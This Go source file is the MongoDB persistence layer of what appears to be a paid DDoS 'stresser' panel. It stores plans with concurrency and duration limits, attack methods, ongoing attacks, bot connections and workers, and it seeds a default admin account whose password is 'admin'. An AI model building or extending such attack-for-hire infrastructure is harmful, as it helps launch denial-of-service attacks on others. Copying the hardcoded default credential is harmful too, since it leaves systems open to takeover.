package main

import (
	"context"
	"log"
	"time"

	"go.mongodb.org/mongo-driver/v2/bson"
	"go.mongodb.org/mongo-driver/v2/mongo"
	"go.mongodb.org/mongo-driver/v2/mongo/options"
)

type MongoDBBackend struct {
	client *mongo.Client
	db     *mongo.Database
}

func (m *MongoDBBackend) Init() error {
	uri := appConfig.Database.MongoDBURI
	if uri == "" {
		log.Fatal("[mongo] MONGODB_URI not set in config.json")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	client, err := mongo.Connect(options.Client().ApplyURI(uri))
	if err != nil {
		return err
	}
	if err := client.Ping(ctx, nil); err != nil {
		return err
	}
	m.client = client
	dbName := appConfig.Database.MongoDBDB
	if dbName == "" {
		dbName = "levl7"
	}
	m.db = client.Database(dbName)
	log.Println("[mongo] connected to", dbName)
	m.seedAdmin()
	loadData()
	return nil
}

func (m *MongoDBBackend) col(name string) *mongo.Collection {
	return m.db.Collection(name)
}

func (m *MongoDBBackend) seedAdmin() {
	count, err := m.col("users").CountDocuments(context.TODO(), bson.M{})
	if err == nil && count == 0 {
		admin := User{
			ID: generateID(), Username: "admin", Email: "admin@admin.com",
			Password: hashPassword("admin"), Rule: "Admin", Plan: "Ultimate",
			JoinDate: time.Now().Format(time.RFC3339), MaxConcurrents: 999, MaxSeconds: 86400, APIKey: generateToken(),
		}
		m.SaveUser(admin)
		free := Plan{Name: "Free", MaxConcurrents: 1, MaxSeconds: 300, MinSeconds: 10}
		m.SavePlan(free)
	}
}

func (m *MongoDBBackend) SaveUser(u User) error {
	users.Store(u.Username, u)
	_, err := m.col("users").UpdateOne(context.TODO(),
		bson.M{"username": u.Username},
		bson.M{"$set": u},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) GetUserByUsername(username string) (User, bool) {
	v, ok := users.Load(username)
	if !ok {
		return User{}, false
	}
	return v.(User), true
}

func (m *MongoDBBackend) DeleteUser(username string) error {
	users.Delete(username)
	_, err := m.col("users").DeleteOne(context.TODO(), bson.M{"username": username})
	return err
}

func (m *MongoDBBackend) GetAllUsers() ([]User, error) {
	cursor, err := m.col("users").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	us := make([]User, 0)
	cursor.All(context.TODO(), &us)
	return us, nil
}

func (m *MongoDBBackend) SavePlan(p Plan) error {
	plans.Store(p.Name, p)
	_, err := m.col("plans").UpdateOne(context.TODO(),
		bson.M{"name": p.Name},
		bson.M{"$set": p},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) DeletePlan(name string) error {
	plans.Delete(name)
	_, err := m.col("plans").DeleteOne(context.TODO(), bson.M{"name": name})
	return err
}

func (m *MongoDBBackend) GetAllPlans() ([]Plan, error) {
	cursor, err := m.col("plans").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	ps := make([]Plan, 0)
	cursor.All(context.TODO(), &ps)
	return ps, nil
}

func (m *MongoDBBackend) SaveMethod(mt Method) error {
	methodList.Store(mt.Method, mt)
	_, err := m.col("methods").UpdateOne(context.TODO(),
		bson.M{"method": mt.Method},
		bson.M{"$set": mt},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) DeleteMethod(name string) error {
	methodList.Delete(name)
	_, err := m.col("methods").DeleteOne(context.TODO(), bson.M{"method": name})
	return err
}

func (m *MongoDBBackend) GetAllMethods() ([]Method, error) {
	cursor, err := m.col("methods").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	ms := make([]Method, 0)
	cursor.All(context.TODO(), &ms)
	return ms, nil
}

func (m *MongoDBBackend) SaveOngoingAttack(a Attack) error {
	ongoingAttacks.Store(a.ID, a)
	_, err := m.col("attacks").UpdateOne(context.TODO(),
		bson.M{"attack_id": a.ID},
		bson.M{"$set": a},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) DeleteOngoingAttack(id string) error {
	ongoingAttacks.Delete(id)
	_, err := m.col("attacks").DeleteOne(context.TODO(), bson.M{"attack_id": id})
	return err
}

func (m *MongoDBBackend) GetAllOngoingAttacks() ([]Attack, error) {
	cursor, err := m.col("attacks").Find(context.TODO(), bson.M{"time_remaining": bson.M{"$gt": 0}})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	as := make([]Attack, 0)
	cursor.All(context.TODO(), &as)
	return as, nil
}

func (m *MongoDBBackend) SaveSession(token, username string) error {
	sessions.Store(token, username)
	_, err := m.col("sessions").UpdateOne(context.TODO(),
		bson.M{"token": token},
		bson.M{"$set": bson.M{"token": token, "username": username}},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) GetSessionUsername(token string) (string, bool) {
	v, ok := sessions.Load(token)
	if !ok {
		return "", false
	}
	return v.(string), true
}

func (m *MongoDBBackend) SaveBot(b BotConnection) error {
	botConnections.Store(b.ID, b)
	_, err := m.col("bot_connections").UpdateOne(context.TODO(),
		bson.M{"id": b.ID},
		bson.M{"$set": b},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) GetAllBots() ([]BotConnection, error) {
	cursor, err := m.col("bot_connections").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	bs := make([]BotConnection, 0)
	cursor.All(context.TODO(), &bs)
	return bs, nil
}

func (m *MongoDBBackend) SaveProof(p Proof) error {
	_, err := m.col("proofs").UpdateOne(context.TODO(),
		bson.M{"id": p.ID},
		bson.M{"$set": p},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) DeleteProof(id string) error {
	_, err := m.col("proofs").DeleteOne(context.TODO(), bson.M{"id": id})
	return err
}

func (m *MongoDBBackend) GetAllProofs() ([]Proof, error) {
	cursor, err := m.col("proofs").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	ps := make([]Proof, 0)
	cursor.All(context.TODO(), &ps)
	return ps, nil
}

func (m *MongoDBBackend) SaveBroadcast(b Broadcast) error {
	_, err := m.col("broadcasts").UpdateOne(context.TODO(),
		bson.M{"id": b.ID},
		bson.M{"$set": b},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) DeleteBroadcast(id string) error {
	_, err := m.col("broadcasts").DeleteOne(context.TODO(), bson.M{"id": id})
	return err
}

func (m *MongoDBBackend) GetAllBroadcasts() ([]Broadcast, error) {
	cursor, err := m.col("broadcasts").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	bs := make([]Broadcast, 0)
	cursor.All(context.TODO(), &bs)
	return bs, nil
}

func (m *MongoDBBackend) SaveWorker(w Worker) error {
	workersMap.Store(w.ID, w)
	_, err := m.col("workers").UpdateOne(context.TODO(),
		bson.M{"id": w.ID},
		bson.M{"$set": w},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) GetAllWorkers() ([]Worker, error) {
	cursor, err := m.col("workers").Find(context.TODO(), bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	ws := make([]Worker, 0)
	cursor.All(context.TODO(), &ws)
	return ws, nil
}

func (m *MongoDBBackend) DeleteWorker(id string) error {
	workersMap.Delete(id)
	_, err := m.col("workers").DeleteOne(context.TODO(), bson.M{"id": id})
	return err
}

func (m *MongoDBBackend) GetWorkerByID(id string) (Worker, bool) {
	v, ok := workersMap.Load(id)
	if !ok {
		return Worker{}, false
	}
	return v.(Worker), true
}

func (m *MongoDBBackend) SaveGitHubConfig(cfg GitHubConfig) error {
	_, err := m.col("github_config").UpdateOne(context.TODO(),
		bson.M{"id": "main"},
		bson.M{"$set": cfg},
		options.UpdateOne().SetUpsert(true))
	return err
}

func (m *MongoDBBackend) GetGitHubConfig() (GitHubConfig, error) {
	var cfg GitHubConfig
	err := m.col("github_config").FindOne(context.TODO(), bson.M{"id": "main"}).Decode(&cfg)
	if err != nil {
		return GitHubConfig{ID: "main", Branch: "main", FilePath: "master.json", Enabled: false}, nil
	}
	return cfg, nil
}

func (m *MongoDBBackend) GetActiveBroadcasts() ([]Broadcast, error) {
	now := time.Now().Format(time.RFC3339)
	cursor, err := m.col("broadcasts").Find(context.TODO(), bson.M{"$or": []bson.M{
		{"end_time": ""},
		{"end_time": "-"},
		{"end_time": bson.M{"$gt": now}},
	}})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(context.TODO())
	bs := make([]Broadcast, 0)
	cursor.All(context.TODO(), &bs)
	return bs, nil
}
